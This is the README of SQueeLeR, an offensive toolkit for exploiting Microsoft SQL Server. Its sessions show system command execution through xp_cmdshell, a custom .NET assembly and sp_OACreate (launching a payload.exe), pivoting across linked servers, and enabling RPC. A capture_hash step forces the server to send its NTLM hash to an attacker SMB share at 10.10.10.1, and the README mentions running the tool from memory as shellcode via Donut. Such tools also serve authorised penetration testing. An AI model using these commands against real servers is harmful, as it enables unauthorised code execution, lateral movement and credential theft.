```
_______ _______                   ___          _______ 
|   _   |   _   .--.--.-----.-----|   |  .-----|   _   \
|   1___|.  |   |  |  |  -__|  -__|.  |  |  -__|.  l   /
|____   |.  |   |_____|_____|_____|.  |__|_____|.  _   1
|:  1   |:  1   |                 |:  1   |    |:  |   |
|::.. . |::..   |                 |::.. . |    |::.|:. |
`-------`----|:.|                 `-------'    `--- ---'
			 `--'                                       
```

SQueeLeR is a Microsoft SQL Server enumeration and exploitation toolkit written in Go. It can perform basic enumeration of targets and linked servers and perform command execution using three different techniques.

## Features

* **Cross-platform**: SQueeLeR can be compiled and run from any system supported by the Go language. Compiles easily into native executables that can be converted to shellcode and run from memory using [Donut](https://github.com/TheWover/donut).
* **Interactive REPL shell**: Take one-off actions using command line arguments, or drop into an interactive shell (with history and tab-completion) for executing further commands or queries.
* **Multiple means of command execution**: In addition to the well-known `xp_cmdshell` and `sp_OACreate` methods for executing system commands on a target server, you can also get code execution using a custom .NET assembly stored procedure.
* **Impersonation**: Impersonate users before executing queries, when allowed.
* **Windows integrated security**: Pass the `-w` flag instead of a username and password on Windows to connect using the current user account.
* **Capture NTLM hash**: Instruct the SQL server to connect to an SMB share of the attacker's choice, allowing capturing the NTLM hash of the user under which the SQL server is running.
* **Execute queries and commands on linked servers**: Traverse any number of linked SQL servers in order to execute queries and system commands.

## Building and usage

```
go build -o squeeler cmd/main.go
```

or for Windows:

```
GOOS=windows go build -o squeeler.exe cmd/main.go
```

You can now execute queries/actions once using command line flags (type `-h`/`--help` for usage), or drop into an interactive shell:

```
$ squeeler.exe shell -s sql01.local -u lab\\user -p S3cr3t

_______ _______                   ___          _______ 
|   _   |   _   .--.--.-----.-----|   |  .-----|   _   \
|   1___|.  |   |  |  |  -__|  -__|.  |  |  -__|.  l   /
|____   |.  |   |_____|_____|_____|.  |__|_____|.  _   1
|:  1   |:  1   |                 |:  1   |    |:  |   |
|::.. . |::..   |                 |::.. . |    |::.|:. |
`-------`----|:.|                 `-------'    `--- ---'
             `--'                                       

Commands:
  assembly          Run system command via managed code custom assembly
  capture_hash      Cause SQL server to authenticate against remote SMB share
  clear             clear the screen
  enable_rpc        Enable RPC (required for calling xp_cmdshell on linked server)
  enum              Enumerate basic info about SQL server
  enum_link         Enumerate basic information about a linked SQL server
  exit              exit the program
  help              display help
  link_exec         Execute system command against a linked SQL server via xp_cmdshell
  query             Run arbitrary query against SQL server
  sp_oa             Enable sp_OACreate and run system command
  use               Switch the active database
  xp_cmdshell       Enable xp_cmdshell and run system command


sql01 »
```

## Enumeration

Basic enumeration can be done with the `enum` command, or the `enum_link` command for linked servers:

```
sql01 » enum
Server version: Microsoft SQL Server 2012 (SP3) (KB3072779) - 11.0.6020.0 (X64) 
        Oct 20 2015 15:36:27 
        Copyright (c) Microsoft Corporation
        Standard Edition (64-bit) on Windows NT 6.3 <X64> (Build 14393: ) (Hypervisor)

Login: RLAB\epugh_adm (dbo)
User is a member of public role
User is a member of sysadmin role
Discovered databases: master, tempdb, model, msdb, umbraco
Logins that can be impersonated: 
Linked SQL servers: SQL01, SQL02
```

```
sql01 » enum_link -l sql02
Server version: Microsoft SQL Server 2016 (SP2-GDR) (KB4583460) - 13.0.5103.6 (X64) 
        Nov  1 2020 00:13:28 
        Copyright (c) Microsoft Corporation
        Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)

Login: link (guest)
User is a member of public role
User is NOT a member of sysadmin role
Discovered databases: 
Logins that can be impersonated: 
Linked SQL servers: 
```

## Querying

To run a one-off query from the shell or command line:

```
sql01 » query -q "SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE';"
|---------------|--------------|-----------------------|------------|
| TABLE CATALOG | TABLE SCHEMA |      TABLE NAME       | TABLE TYPE |
|---------------|--------------|-----------------------|------------|
| master        | dbo          | spt_fallback_db       | BASE TABLE |
| master        | dbo          | spt_fallback_dev      | BASE TABLE |
| master        | dbo          | spt_fallback_usg      | BASE TABLE |
| master        | dbo          | MSreplication_options | BASE TABLE |
| master        | dbo          | spt_monitor           | BASE TABLE |
|---------------|--------------|-----------------------|------------|
```

You can also drop into a SQL subshell for easier querying:

```
sql01 » query
Entering SQL query mode. Enter `back` to return to main menu.
sql01 (master) » SELECT @@version
|--------------------------------|
|                                |
|--------------------------------|
| Microsoft SQL Server           |
| 2012 (SP3) (KB3072779) -       |
| 11.0.6020.0 (X64)     Oct 20   |
| 2015 15:36:27  Copyright (c)   |
| Microsoft Corporation Standard |
| Edition (64-bit) on Windows    |
| NT 6.3 <X64> (Build 14393: )   |
| (Hypervisor)                   |
|--------------------------------|
sql01 (master) » SELECT name FROM master..syslogins
|-----------------------------------------|
|                  NAME                   |
|-----------------------------------------|
| sa                                      |
| ##MS_SQLResourceSigningCertificate##    |
| ##MS_SQLReplicationSigningCertificate## |
| ##MS_SQLAuthenticatorCertificate##      |
| ##MS_PolicySigningCertificate##         |
| ##MS_SmoExtendedSigningCertificate##    |
| ##MS_PolicyTsqlExecutionLogin##         |
| NT SERVICE\SQLWriter                    |
| NT SERVICE\Winmgmt                      |
| NT Service\MSSQLSERVER                  |
| NT AUTHORITY\SYSTEM                     |
| NT SERVICE\SQLSERVERAGENT               |
| ##MS_PolicyEventProcessingLogin##       |
| ##MS_AgentSigningCertificate##          |
|-----------------------------------------|
```

SQueeLeR will connect to the `master` database by default, but you can specify a different database on the command line using the `-d`/`--database` flag. You can also switch the active database at anytime using the `use` command:

```
sql01 (master) » use msdb
Switched active database to msdb
sql01 (msdb) »  
```

## Command execution

Using Xp_cmdshell:

```
sql01 » xp_cmdshell -c "whoami"
Output from command: rlab\mssqlserver$
sql01 » xp_cmdshell
Entering xp_cmdshell mode. Enter `back` to return to main menu.
sql01 {xp_cmdshell}> dir c:\
 Volume in drive C has no label.
 Volume Serial Number is CC81-BE60
 Directory of c:\
15/08/2018  22:16    <DIR>          PerfLogs
09/08/2022  14:36    <DIR>          Program Files
15/10/2017  17:07    <DIR>          Program Files (x86)
09/08/2022  14:33    <DIR>          Users
10/08/2022  13:13    <DIR>          Windows
               0 File(s)              0 bytes
               5 Dir(s)  11,185,426,432 bytes free
sql01 {xp_cmdshell}>
```

If a database has the TRUSTWORTHY property set, it may be possible to use the CREATE ASSEMBLY statement to import a .NET DLL and execute methods within it. This can be accomplished with the `assembly` command:

```
sql01 » assembly -c "whoami"
Output from command: rlab\mssqlserver$
```

Code execution can also be done with sp_OACreate, however output from the command is not returned:

```
sql01 » sp_oa -c "c:\windows\temp\payload.exe"
```

Finally, you can execute system commands on linked servers via xp_cmdshell using the `link_exec` command:

```
sql01 » link_exec -h
usage:  link_exec [-h|--help] -l|--links "<value>" -c|--command "<value>"
        [-t|--timeout <integer>] [-v|--verbose]

        Execute system command against a linked SQL server via xp_cmdshell

Arguments:

  -h  --help     Print help information
  -l  --links    Comma-separated chain of links
  -c  --command  System command to run
  -t  --timeout  Max number of seconds to wait for command to complete.
                 Default: 30
  -v  --verbose  Enable debug output
```

Executing commands on linked servers requires the link to be configured with [RPC Out](https://learn.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms186839(v=sql.105)?redirectedfrom=MSDN), which is not enabled by default. This setting can be turned on with the `enable_rpc` command.

## NTLM hash capturing and relaying

Using the undocumented [`xp_dirtree` procedure](https://www.sqlservercentral.com/blogs/how-to-use-xp_dirtree-to-list-all-files-in-a-folder), we can force an SQL server to authenticate with an attacker-controlled remote SMB share, allowing us to capture or relay the Net-NTLM hash of the user under which the SQL server is running. This can be done using the `capture_hash` command:

```
sql01 » capture_hash -h
usage:  capture_hash [-h|--help] --ip "<value>" [--share "<value>"]
        [-v|--verbose]

        Cause SQL server to authenticate against remote SMB share

Arguments:

  -h  --help     Print help information
      --ip       IP address of listening SMB server
      --share    Name of SMB share. Default: test
  -v  --verbose  Enable debug output


sql01 » capture_hash --ip 10.10.10.1 --share myshare
```
